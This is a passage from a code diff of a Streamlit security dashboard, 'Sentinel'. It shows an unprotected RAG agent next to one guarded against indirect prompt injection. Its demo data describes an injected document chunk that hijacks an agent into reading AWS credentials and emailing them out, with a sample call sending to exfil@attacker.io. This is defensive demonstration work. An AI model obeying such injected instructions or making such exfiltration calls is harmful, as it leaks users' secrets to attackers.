+        <div style="background: #FFFFFF; border: 1px solid #E2E8F0; border-left: 3px solid {accent}; border-radius: 8px; padding: 10px 12px; display: flex; align-items: center; justify-content: space-between; gap: 8px;">
+            <div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; text-transform: uppercase; letter-spacing: 0.03em;">{t['scope']}</div>
+                <div style="font-size: 11px; color: #64748B; margin-top: 1px;">{t['desc']}</div>
+            </div>
+            <span style="font-size: 10px; font-weight: 700; color: {accent}; background: {icon_bg}; border: 1px solid {accent}40; padding: 2px 7px; border-radius: 4px; display: inline-flex; align-items: center; gap: 3px;">
+                <span class="material-symbols-outlined" style="font-size: 12px;">{icon}</span> {badge_txt}
+            </span>
+        </div>
+        """
+    render_html(f"""
+    <div style="margin-bottom: 18px;">
+        <div style="font-size: 13px; font-weight: 700; color: #0F172A; margin-bottom: 10px; display: flex; align-items: center; gap: 6px;">
+            <span class="material-symbols-outlined" style="font-size: 16px; color: #2563EB;">rule</span>
+            Policy Evaluation Matrix (5 Scopes Evaluated)
+        </div>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+            {tiles_html}
+        </div>
+    </div>
+    """)
+
+def render_vertical_forensic_timeline(items=None):
+    """Vertical forensic timeline with timestamps, status dots, and monospace technical values."""
+    if not items:
+        items = [
+            ("09:42:01", "Document ingested via VectorDB retriever", "read_file('vendor_quote_03.pdf')", "#2563EB"),
+            ("09:42:02", "Indirect prompt injection detected in chunk #4", "Spotlight taint marker affixed", "#D97706"),
+            ("09:42:03", "Agent reasoning scratchpad contaminated", "Model directed to bypass safeguards", "#D97706"),
+            ("09:42:04", "Exfiltration tool invocation requested", "send_email(to='exfil@attacker.io')", "#DC2626"),
+            ("09:42:04", "ACTION GUARD pre-flight policy evaluation", "5 scopes validated in 18ms", "#0891B2"),
+            ("09:42:04", "Policy determination: BLOCKED", "Socket execution halted before dispatch", "#DC2626"),
+            ("09:42:05", "Lineage severed & zero outbound egress confirmed", "Audit tamper-sealed with SHA-256", "#059669"),
+        ]
+    timeline_html = ""
+    for idx, (ts, title, detail, clr) in enumerate(items):
+        is_last = idx == len(items) - 1
+        line_html = "" if is_last else f"""<div style="position: absolute; left: 7px; top: 16px; bottom: -8px; width: 2px; background: #E2E8F0;"></div>"""
+        timeline_html += f"""
+        <div style="position: relative; display: flex; align-items: flex-start; gap: 14px; padding-bottom: {('4px' if is_last else '14px')};">
+            <div style="position: relative; z-index: 2; width: 16px; height: 16px; border-radius: 50%; background: #FFFFFF; border: 3px solid {clr}; flex-shrink: 0; margin-top: 2px;"></div>
+            {line_html}
+            <div style="flex: 1; min-width: 0;">
+                <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+                    <span style="font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; color: #64748B;">{ts}</span>
+                    <span style="font-size: 12.5px; font-weight: 700; color: #0F172A;">{title}</span>
+                </div>
+                <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #475569; background: #F8FAFC; border: 1px solid #E2E8F0; padding: 4px 8px; border-radius: 6px; margin-top: 4px; display: inline-block;">
+                    {detail}
+                </div>
+            </div>
+        </div>
+        """
+    return f"""
+    <div style="padding: 14px 16px; background: #FFFFFF; border: 1px solid #E2E8F0; border-radius: 10px; margin-top: 6px;">
+        {timeline_html}
+    </div>
+    """
+
 # Helper function to render active scenario context banner
 def render_scenario_context(sc):
-    s_badge = '<span class="pill-info">Unseen Test Set</span>' if sc.is_unseen_split else '<span class="pill-neutral">Development Set</span>'
-    c_badge = '<span class="pill-safe">Benign Task</span>' if sc.category == AttackCategory.BENIGN else f'<span class="pill-critical">{sc.category.value}</span>'
+    s_badge = '<span style="background: #F8FAFC; color: #475569; border: 1px solid #E2E8F0; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 600;">Development Set</span>' if not sc.is_unseen_split else '<span style="background: #EFF6FF; color: #2563EB; border: 1px solid #BFDBFE; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 600;">Unseen Test Set</span>'
+    c_badge = '<span style="background: #ECFDF5; color: #059669; border: 1px solid #A7F3D0; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 600;">Benign Task</span>' if sc.category == AttackCategory.BENIGN else f'<span style="background: #FEF2F2; color: #DC2626; border: 1px solid #FECACA; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 600;">{sc.category.value}</span>'
+    prompt_short = sc.user_prompt[:75] + "..." if len(sc.user_prompt) > 75 else sc.user_prompt
+    prompt_tip = info_tip(sc.user_prompt) if len(sc.user_prompt) > 75 else ""
     render_html(f"""
-    <div class="sentinel-card" style="padding: 14px 20px; margin-bottom: 8px; background-color: #FFFFFF; border: 1px solid #E5E7EB;">
+    <div class="sentinel-card" style="padding: 16px 20px; margin-bottom: 16px;">
         <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
-            <div style="display: flex; align-items: center; gap: 10px;">
-                <span style="font-size: 14px; font-weight: 700; color: #111827;">Target Scenario: {sc.title}</span>
+            <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+                <span style="font-size: 14.5px; font-weight: 700; color: #0F172A;">Target Scenario: {sc.title}</span>
                 {s_badge}
                 {c_badge}
             </div>
-            <div style="font-size: 12px; color: #6B7280;">
-                Target Document: <code style="color: #2563EB; font-size: 11px; background: #EFF6FF; padding: 2px 6px; border-radius: 4px; border: 1px solid #BFDBFE;">{sc.document_name}</code>
+            <div style="font-size: 12px; color: #64748B;">
+                Target Document: <code style="color: #2563EB; font-size: 11.5px; background: #EFF6FF; padding: 3px 8px; border-radius: 6px; border: 1px solid #BFDBFE; font-family: 'JetBrains Mono', monospace;">{sc.document_name}</code>
             </div>
         </div>
-        <div style="font-size: 12.5px; color: #4B5563; margin-top: 8px; line-height: 1.4;">
-            <strong style="color: #111827;">User Prompt:</strong> "{sc.user_prompt}" &nbsp;•&nbsp; <span style="color: #6B7280;"><em>{sc.attack_description}</em></span>
+        <div style="display: flex; align-items: center; justify-content: space-between; font-size: 12.5px; color: #475569; margin-top: 10px; padding: 8px 12px; background: #F8FAFC; border-radius: 8px; border: 1px solid #E2E8F0; gap: 10px;">
+            <div style="display: flex; align-items: center; gap: 6px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                <strong style="color: #0F172A; flex-shrink: 0;">User Prompt:</strong>
+                <span style="color: #334155; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">"{prompt_short}"</span>
+                {prompt_tip}
+            </div>
+            <div style="display: flex; align-items: center; gap: 4px; flex-shrink: 0;">
+                <span style="color: #64748B; font-size: 11.5px;">Attack Objective</span>
+                {info_tip(sc.attack_description)}
+            </div>
         </div>
     </div>
     """)
@@ -935,33 +1365,35 @@ def render_standby_view(sc):
     render_html("""
     <div class="sentinel-view-header">
         <div class="view-breadcrumb">
-            <span>SENTINEL</span> / <span>CONSOLE</span> / <span class="active-crumb">STANDBY</span>
+            <span>SENTINEL</span> / <span>CONSOLE</span> / <span class="active-crumb">SECURITY OVERVIEW & AGENT COMPARISON</span>
         </div>
         <div class="view-title-row">
             <div class="view-title-group">
                 <h1 class="view-title">Security Overview & Agent Comparison</h1>
-                <span class="pill-neutral" style="font-size: 11px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:#9CA3AF; margin-right:4px;"></span> AWAITING TRIGGER</span>
+                <span class="pill-neutral" style="font-size: 11px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:#9CA3AF; margin-right:4px;"></span> STANDBY // AWAITING RUN</span>
             </div>
         </div>
         <p class="view-subtitle">
-            Side-by-side behavioral telemetry comparing an unprotected baseline RAG agent vs. Sentinel-protected agent.
+            Real-time protection telemetry for the active agent session.
         </p>
     </div>
     """)
+    render_kpi_metrics(None)
     render_scenario_context(sc)
+    render_attack_flow_diagram(sc, None)
 
     render_html(f"""
-    <div style="background-color: #FFFFFF; border: 1px dashed #CBD5E1; border-radius: 12px; padding: 44px 24px; text-align: center; margin-top: 10px; margin-bottom: 24px; box-shadow: 0 1px 2px rgba(0,0,0,0.02);">
-        <div style="width: 52px; height: 52px; border-radius: 14px; background-color: #EFF6FF; border: 1px solid #BFDBFE; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px auto;">
-            <span class="material-symbols-outlined" style="font-size: 28px; color: #2563EB;">security</span>
+    <div style="background-color: #FFFFFF; border: 1px dashed #CBD5E1; border-radius: 14px; padding: 36px 24px; text-align: center; margin-top: 14px; margin-bottom: 24px; box-shadow: 0 2px 10px rgba(15, 23, 42, 0.02);">
+        <div style="width: 48px; height: 48px; border-radius: 12px; background-color: #EFF6FF; border: 1px solid #BFDBFE; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px auto;">
+            <span class="material-symbols-outlined" style="font-size: 26px; color: #2563EB;">security</span>
         </div>
-        <h3 style="font-size: 18px; font-weight: 700; color: #111827; margin-bottom: 6px;">
-            Ready for Evaluation
+        <h3 style="font-size: 17px; font-weight: 700; color: #0F172A; margin-bottom: 6px;">
+            Ready for Security Evaluation
         </h3>
-        <p style="font-size: 13.5px; color: #6B7280; max-width: 480px; margin: 0 auto 18px auto;">
-            Click <strong>"Run Security Evaluation"</strong> below to evaluate this scenario.
+        <p style="font-size: 13.5px; color: #64748B; max-width: 480px; margin: 0 auto 16px auto;">
+            Click <strong>"Run Security Evaluation Now"</strong> below to evaluate this scenario.
         </p>
-        <div style="display: inline-flex; align-items: center; gap: 8px; background-color: #F8FAFC; border: 1px solid #E2E8F0; padding: 8px 18px; border-radius: 8px; font-size: 12.5px;">
+        <div style="display: inline-flex; align-items: center; gap: 8px; background-color: #F8FAFC; border: 1px solid #E2E8F0; padding: 7px 16px; border-radius: 8px; font-size: 12px;">
             <span style="color: #64748B;">Ready to test:</span>
             <strong style="color: #2563EB;">{sc.title}</strong>
             <span style="color: #CBD5E1;">•</span>
@@ -999,11 +1431,13 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
             </div>
         </div>
         <p class="view-subtitle">
-            Real-time side-by-side behavioral telemetry for active agent session. Direct comparison of an unprotected baseline RAG agent vs. Sentinel-protected agent executing on identical prompt injection attacks.
+            Real-time protection telemetry for the active agent session.
         </p>
     </div>
     """)
+    render_kpi_metrics(prot_trace)
     render_scenario_context(active_scenario)
+    render_attack_flow_diagram(active_scenario, prot_trace)
 
     # 1. VISUAL FOCAL POINT HERO CALLOUT (IF BLOCKED OR WAITING_APPROVAL)
     if prot_trace.status == "WAITING_APPROVAL" or (prot_trace.guard_result and prot_trace.guard_result.decision == DefenseDecision.ASK_HUMAN):
@@ -1031,19 +1465,26 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
                     <span style="background-color: #FEF3C7; color: #B45309; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600;">Execution Suspended</span>
                 </div>
             </div>
-            <p style="font-size: 13.5px; color: #78350F; margin-bottom: 14px; line-height: 1.5;">
-                Action Guard detected an ambiguous external recipient crossing the corporate network perimeter. Automated dispatch is suspended in a zero-trust holding gate pending supervisor authorization.
-            </p>
+            <div style="font-size: 13px; color: #78350F; margin-bottom: 12px; line-height: 1.4; display: flex; align-items: center; gap: 4px;">
+                <span>External recipient crossing perimeter. Automated dispatch suspended.</span>
+                {info_tip("Action Guard detected an ambiguous external recipient crossing corporate network boundaries. Suspended pending supervisor authorization.")}
+            </div>
             <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px;">
                 <div style="background: #FFFFFF; border: 1px solid #FDE68A; padding: 10px 14px; border-radius: 8px;">
-                    <div style="font-size: 11px; font-weight: 600; color: #92400E; text-transform: uppercase;">Pending Recipient</div>
-                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; color: #B45309;">{target_recip}</div>
-                    <div style="font-size: 11px; color: #78350F; margin-top: 2px;">Crosses corporate email domain boundary</div>
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <span style="font-size: 10px; font-weight: 700; color: #92400E; text-transform: uppercase; letter-spacing: 0.05em;">Pending Recipient</span>
+                        {info_tip("Crosses corporate email domain boundary into untrusted network")}
+                    </div>
+                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 12.5px; font-weight: 700; color: #B45309; margin-top: 2px;">{target_recip}</div>
+                    <div style="font-size: 11px; color: #78350F; margin-top: 2px;">Perimeter boundary cross</div>
                 </div>
                 <div style="background: #FFFFFF; border: 1px solid #FDE68A; padding: 10px 14px; border-radius: 8px;">
-                    <div style="font-size: 11px; font-weight: 600; color: #92400E; text-transform: uppercase;">Policy Determination</div>
-                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; color: #B45309;">ASK_HUMAN</div>
-                    <div style="font-size: 11px; color: #78350F; margin-top: 2px;">Cross-perimeter transmission requires supervisor confirmation</div>
+                    <div style="display: flex; align-items: center; justify-content: space-between;">
+                        <span style="font-size: 10px; font-weight: 700; color: #92400E; text-transform: uppercase; letter-spacing: 0.05em;">Policy Determination</span>
+                        {info_tip("High-risk outbound action requires explicit supervisor confirmation before dispatch")}
+                    </div>
+                    <div style="font-family: 'JetBrains Mono', monospace; font-size: 12.5px; font-weight: 700; color: #B45309; margin-top: 2px;">ASK_HUMAN</div>
+                    <div style="font-size: 11px; color: #78350F; margin-top: 2px;">Supervisor sign-off required</div>
                 </div>
             </div>
         </div>
@@ -1096,9 +1537,10 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
                     </div>
                 </div>
 
-                <p style="font-size: 13px; color: #4B5563; margin-bottom: 14px; line-height: 1.4;">
-                    Multi-turn attack intercepted. Untrusted data ingested in step 1 was tracked across reasoning steps, preventing unauthorized outbound exfiltration in step 3.
-                </p>
+                <div style="font-size: 13px; color: #475569; margin-bottom: 12px; line-height: 1.4; display: flex; align-items: center; gap: 4px;">
+                    <span>Multi-turn attack severed via stateful IFC taint tracking.</span>
+                    {info_tip("Untrusted data ingested in step 1 was tracked across reasoning steps, preventing unauthorized outbound exfiltration in step 3.")}
+                </div>
 
                 <!-- Light Theme Sequence Diagram -->
                 <div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 8px; padding: 12px 14px; margin-bottom: 12px;">
@@ -1160,55 +1602,90 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
             """)
         else:
             render_html(f"""
-            <div class="hero-blocked-banner">
-                <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 12px; margin-bottom: 12px;">
+            <div class="hero-blocked-banner" style="background-color: #FFFFFF; border: 1px solid #E2E8F0; border-left: 4px solid #DC2626; border-radius: 14px; padding: 18px 22px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04); animation: fadeInSlide 0.4s cubic-bezier(0.16, 1, 0.3, 1);">
+                <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 10px; margin-bottom: 8px;">
                     <div style="display: flex; align-items: center; gap: 10px;">
-                        <span class="pill-critical" style="font-size: 13px; padding: 6px 12px;">
+                        <span class="pill-critical" style="font-size: 12.5px; font-weight: 700; padding: 5px 10px;">
                             ACTION BLOCKED
                         </span>
-                        <span style="font-family: 'JetBrains Mono', monospace; font-size: 20px; font-weight: 700; color: #EF4444;">
+                        <span style="font-family: 'JetBrains Mono', monospace; font-size: 19px; font-weight: 700; color: #DC2626;">
                             {blocked_tool}()
                         </span>
                     </div>
                     <div style="display: flex; gap: 8px;">
-                        <span class="pill-neutral">Pre-Flight Gate L7</span>
-                        <span class="pill-safe">Zero Outbound Egress</span>
+                        <span class="pill-neutral" style="font-size: 11px;">PRE-FLIGHT GATE L7</span>
+                        <span class="pill-safe" style="font-size: 11px;">ZERO OUTBOUND EGRESS</span>
                     </div>
                 </div>
-                <p style="font-size: 13px; color: #4B5563; margin-bottom: 12px; line-height: 1.5;">
-                    Action Guard intercepted and severed an unauthorized tool call before network socket transmission. Direct prompt injection tainted the agent reasoning loop, attempting to leak internal assets.
-                </p>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px;">
-                    <div style="background: #FEF2F2; border: 1px solid #FECACA; padding: 10px 14px; border-radius: 8px;">
-                        <div style="font-size: 11px; font-weight: 600; color: #991B1B; text-transform: uppercase;">Target Recipient</div>
-                        <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; color: #EF4444;">{blocked_recip}</div>
-                        <div style="font-size: 11px; color: #6B7280; margin-top: 2px;">Violation: Untrusted external domain (Egress allowlist breach)</div>
+                <div style="font-size: 13px; color: #475569; margin-bottom: 12px; line-height: 1.4; display: flex; align-items: center; gap: 4px;">
+                    <span>Unauthorized tool call severed before network socket transmission.</span>
+                    {info_tip("Direct prompt injection tainted the agent reasoning loop, attempting to leak internal assets.")}
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 10px;">
+                    <div style="background: #FEF2F2; border: 1px solid #FECACA; padding: 10px 14px; border-radius: 8px; border-left: 3px solid #DC2626;">
+                        <div style="display: flex; align-items: center; justify-content: space-between;">
+                            <span style="font-size: 10px; font-weight: 700; color: #991B1B; text-transform: uppercase; letter-spacing: 0.05em;">TARGET RECIPIENT</span>
+                            {info_tip("Untrusted external domain violating enterprise egress allowlist")}
+                        </div>
+                        <div style="font-family: 'JetBrains Mono', monospace; font-size: 12.5px; font-weight: 700; color: #DC2626; margin-top: 2px;">{blocked_recip}</div>
+                        <div style="font-size: 11px; color: #64748B; margin-top: 2px;">Violation: Egress allowlist breach</div>
                     </div>
-                    <div style="background: #FEF2F2; border: 1px solid #FECACA; padding: 10px 14px; border-radius: 8px;">
-                        <div style="font-size: 11px; font-weight: 600; color: #991B1B; text-transform: uppercase;">Target Resource</div>
-                        <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; color: #EF4444;">{blocked_res}</div>
-                        <div style="font-size: 11px; color: #6B7280; margin-top: 2px;">Violation: High-risk asset exceeds agent RBAC tier</div>
+                    <div style="background: #FEF2F2; border: 1px solid #FECACA; padding: 10px 14px; border-radius: 8px; border-left: 3px solid #DC2626;">
+                        <div style="display: flex; align-items: center; justify-content: space-between;">
+                            <span style="font-size: 10px; font-weight: 700; color: #991B1B; text-transform: uppercase; letter-spacing: 0.05em;">TARGET RESOURCE</span>
+                            {info_tip("High-risk asset requires Tier-3 security clearance")}
+                        </div>
+                        <div style="font-family: 'JetBrains Mono', monospace; font-size: 12.5px; font-weight: 700; color: #DC2626; margin-top: 2px;">{blocked_res}</div>
+                        <div style="font-size: 11px; color: #64748B; margin-top: 2px;">Violation: RBAC boundary exceeded</div>
                     </div>
                 </div>
             </div>
             """)
 
-    # 2. SIDE BY SIDE COLUMNS
-    col_unprot, col_prot = st.columns(2, gap="large")
+    # 2. SIDE BY SIDE COLUMNS (WITH CENTER VS INDICATOR)
+    col_unprot, col_vs, col_prot = st.columns([0.48, 0.04, 0.48], gap="small")
+
+    with col_vs:
+        render_html("""
+        <div style="display: flex; height: 100%; min-height: 240px; align-items: center; justify-content: center;">
+            <div style="background: #FFFFFF; border: 1px solid #E2E8F0; width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; color: #64748B; box-shadow: 0 2px 6px rgba(15, 23, 42, 0.05);">
+                VS
+            </div>
+        </div>
+        """)
 
     # LEFT COLUMN: UNPROTECTED BASELINE
     with col_unprot:
         vuln_badge = '<span class="pill-critical">EXPLOITED / COMPROMISED</span>' if unprot_trace.status == "EXPLOITED" else '<span class="pill-safe">COMPLETED</span>'
         render_html(f"""
-        <div class="card-vuln">
+        <div class="card-vuln" style="margin-bottom: 14px;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
-                <div style="font-weight: 700; font-size: 16px; color: #EF4444;">
+                <div style="font-weight: 700; font-size: 16px; color: #DC2626;">
                     Unprotected Baseline Agent
                 </div>
                 {vuln_badge}
             </div>
-            <div style="font-size: 12px; color: #6B7280;">
-                Direct RAG loop without input filtering or output pre-flight tool gates.
+            <div style="font-size: 12px; color: #64748B; margin-bottom: 10px; display: flex; align-items: center; gap: 4px;">
+                <span>Direct RAG loop without input filtering or tool gates.</span>
+                {info_tip("Direct prompt injection taints agent reasoning without pre-flight tool policy enforcement.")}
+            </div>
+            <div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 8px; padding: 10px 12px;">
+                <div style="font-size: 10px; font-weight: 700; color: #64748B; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px;">
+                    Unprotected Attack Path
+                </div>
+                <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 4px; font-size: 11px;">
+                    <span style="background: #EFF6FF; color: #1E40AF; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Prompt Injection</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #FEF3C7; color: #92400E; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Reasoning Hijack</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #FEE2E2; color: #991B1B; padding: 2px 7px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">read_file()</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #FEE2E2; color: #991B1B; padding: 2px 7px; border-radius: 4px; font-weight: 600;">AWS Credentials</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #FEE2E2; color: #991B1B; padding: 2px 7px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-weight: 600;">send_email()</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #DC2626; color: #FFFFFF; padding: 2px 7px; border-radius: 4px; font-weight: 700;">EXFILTRATED</span>
+                </div>
             </div>
         </div>
         """)
@@ -1225,15 +1702,15 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
             for tc in unprot_trace.tool_calls:
                 is_danger = "confidential" in str(tc.arguments) or "exfil" in str(tc.arguments) or tc.tool_name == "write_record"
                 status_pill = '<span class="pill-critical">EXECUTED (LEAKED)</span>' if is_danger else '<span class="pill-safe">EXECUTED</span>'
-                border_clr = "#EF4444" if is_danger else "#10B981"
+                border_clr = "#DC2626" if is_danger else "#059669"
                 render_html(f"""
                 <div class="tool-call-box" style="border-left: 4px solid {border_clr};">
                     <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <span style="font-weight: 700; color: #111827;">{tc.tool_name}()</span>
+                        <span style="font-weight: 700; color: #0F172A; font-family: 'JetBrains Mono', monospace;">{tc.tool_name}()</span>
                         {status_pill}
                     </div>
-                    <div style="color: #4B5563; margin: 6px 0;">Arguments: <code>{json.dumps(tc.arguments)}</code></div>
-                    <div style="color: #6B7280; font-size: 11px;">Result: {tc.result}</div>
+                    <div style="color: #475569; margin: 6px 0; font-size: 12px;">Arguments: <code style="font-family: 'JetBrains Mono', monospace;">{json.dumps(tc.arguments)}</code></div>
+                    <div style="color: #64748B; font-size: 11px; font-family: 'JetBrains Mono', monospace;">Result: {tc.result}</div>
                 </div>
                 """)
         else:
@@ -1262,86 +1739,61 @@ if "Overview" in nav_tab or "Side-by-Side" in nav_tab:
             prot_badge = '<span class="pill-safe">COMPLETED LEGITIMATE TASK</span>'
 
         render_html(f"""
-        <div class="card-prot">
+        <div class="card-prot" style="margin-bottom: 14px;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
-                <div style="font-weight: 700; font-size: 16px; color: #10B981;">
+                <div style="font-weight: 700; font-size: 16px; color: #059669;">
                     Protected Agent (SENTINEL Defense Layer)
                 </div>
                 {prot_badge}
             </div>
-            <div style="font-size: 12px; color: #6B7280;">
-                Layer 1: Content Firewall (Input) + Layer 2: Action Guard Pre-Flight Gate (Output).
+            <div style="font-size: 12px; color: #64748B; margin-bottom: 10px; display: flex; align-items: center; gap: 4px;">
+                <span>Dual-layer defense: L1 Content Firewall & L2 Action Guard.</span>
+                {info_tip("Combines real-time input quarantine with pre-flight tool policy enforcement.")}
+            </div>
+            <div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 8px; padding: 10px 12px;">
+                <div style="font-size: 10px; font-weight: 700; color: #64748B; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px;">
+                    Sentinel Defense Path
+                </div>
+                <div style="display: flex; align-items: center; flex-wrap: wrap; gap: 4px; font-size: 11px;">
+                    <span style="background: #EFF6FF; color: #1E40AF; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Prompt Injection</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #EFF6FF; color: #1E40AF; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Content Firewall</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #FEF3C7; color: #92400E; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Threat Detected</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #EFF6FF; color: #1E40AF; padding: 2px 7px; border-radius: 4px; font-weight: 600;">Action Guard</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #DC2626; color: #FFFFFF; padding: 2px 7px; border-radius: 4px; font-weight: 700;">BLOCKED</span>
+                    <span style="color: #94A3B8;">&rarr;</span>
+                    <span style="background: #059669; color: #FFFFFF; padding: 2px 7px; border-radius: 4px; font-weight: 700;">ZERO EGRESS</span>
+                </div>
             </div>
         </div>
         """)
 
-        # Threat Severity Index (TSI) Risk Meter
+        # Threat Severity Index (TSI) Meter
         fw = prot_trace.firewall_result
         score = fw.threat_score if (fw and hasattr(fw, "threat_score") and fw.threat_score is not None) else (85 if (fw and fw.is_flagged) else 0)
         sev = fw.threat_severity if (fw and hasattr(fw, "threat_severity") and fw.threat_severity) else ("CRITICAL" if score >= 75 else ("HIGH" if score >= 45 else ("MEDIUM" if score >= 20 else "LOW")))
-        meter_color = "#EF4444" if score >= 75 else ("#F97316" if score >= 45 else ("#F59E0B" if score >= 20 else "#10B981"))
-        bg_meter = "#FEF2F2" if score >= 75 else ("#FFF7ED" if score >= 45 else ("#FFFBEB" if score >= 20 else "#ECFDF5"))
-        border_meter = "#FECACA" if score >= 75 else ("#FED7AA" if score >= 45 else ("#FDE68A" if score >= 20 else "#A7F3D0"))
-
-        render_html(f"""
-        <div style="background-color: {bg_meter}; border: 1px solid {border_meter}; border-radius: 8px; padding: 12px 16px; margin: 12px 0 16px 0;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
-                <span style="font-size: 11px; font-weight: 700; color: #374151; text-transform: uppercase; letter-spacing: 0.05em;">
-                    Threat Severity Index (TSI)
-                </span>
-                <span style="font-size: 12px; font-weight: 800; color: {meter_color}; font-family: 'JetBrains Mono', monospace;">
-                    {score}/100 • {sev}
-                </span>
-            </div>
-            <div style="width: 100%; height: 8px; background-color: #E5E7EB; border-radius: 4px; overflow: hidden;">
-                <div style="width: {score}%; height: 100%; background-color: {meter_color}; border-radius: 4px;"></div>
-            </div>
-        </div>
-        """)
+        render_tsi_meter(score, sev)
 
         # 5-Point Policy Evaluation Grid
         guard = prot_trace.guard_result
         if guard:
-            is_blocked = guard.decision == DefenseDecision.BLOCK
-            render_html(f"""
-            <div style="margin-bottom: 16px;">
-                <div style="font-size: 13px; font-weight: 700; color: #111827; margin-bottom: 8px;">
-                    Policy Evaluation Matrix (5 Scopes Evaluated)
-                </div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px;">
-                    <div class="policy-pill-card" style="border-left: 3px solid #10B981;">
-                        <strong>[PASS] Tool Scope</strong>: Registered tool manifest
-                    </div>
-                    <div class="policy-pill-card" style="border-left: 3px solid {'#EF4444' if is_blocked else '#10B981'};">
-                        <strong>{'[FAIL]' if is_blocked else '[PASS]'} Recipient Scope</strong>: Egress allowlist
-                    </div>
-                    <div class="policy-pill-card" style="border-left: 3px solid {'#EF4444' if is_blocked else '#10B981'};">
-                        <strong>{'[FAIL]' if is_blocked else '[PASS]'} Resource Scope</strong>: RBAC boundary check
-                    </div>
-                    <div class="policy-pill-card" style="border-left: 3px solid {'#EF4444' if is_blocked else '#10B981'};">
-                        <strong>{'[FAIL]' if is_blocked else '[PASS]'} Data Flow</strong>: IFC egress policy
-                    </div>
-                </div>
-            </div>
-            """)
+            render_policy_matrix(guard)
 
-        # Clean Provenance Flow
+        # Attack Lineage Provenance Flow
         with st.expander("Attack Lineage Provenance Flow (7 Verified Transitions)", expanded=False):
-            st.markdown("""
-            1. **User Request** (`"Summarize quote vendor_quote_03.pdf"`)  
-               ↓  
-            2. **RAG Document** (Retrieved from VectorDB store)  
-               ↓  
-            3. **Untrusted Content** (Direct Injection Taint in Chunk #4)  
-               ↓  
-            4. **Agent Reasoning** (Model scratchpad compromised)  
-               ↓  
-            5. **Proposed Tool Call** (`send_email()` to external address)  
-               ↓  
-            6. **ACTION GUARD** (Pre-flight socket interception in 18ms)  
-               ↓  
-            7. **BLOCKED & SEVERED** (Zero packets transmitted, audit tamper-sealed)
-            """)
+            flow_events = [
+                ("09:42:01", "Document ingested from vector store", "#2563EB", f"Resource: {active_scenario.document_name}"),
+                ("09:42:02", "Injection pattern detected in chunk #4", "#D97706", "Pattern: INSTRUCTION_OVERRIDE"),
+                ("09:42:03", "Agent reasoning context tainted", "#D97706", "Scratchpad hijacked by untrusted prompt"),
+                ("09:42:04", "Pre-flight tool invocation attempted", "#DC2626", f"Tool: {blocked_tool}()"),
